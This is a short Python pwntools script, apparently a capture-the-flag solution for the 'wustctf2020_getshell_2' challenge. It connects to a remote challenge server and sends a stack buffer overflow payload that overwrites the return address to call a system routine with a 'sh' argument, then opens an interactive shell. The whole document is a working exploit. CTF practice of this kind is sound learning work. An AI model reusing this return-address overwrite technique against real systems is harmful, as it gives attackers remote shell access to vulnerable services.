from pwn import *

# sh=process("./wustctf2020_getshell_2")
sh=remote("node4.buuoj.cn","28826")

payload='a'*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)
sh.sendline(payload)
sh.interactive()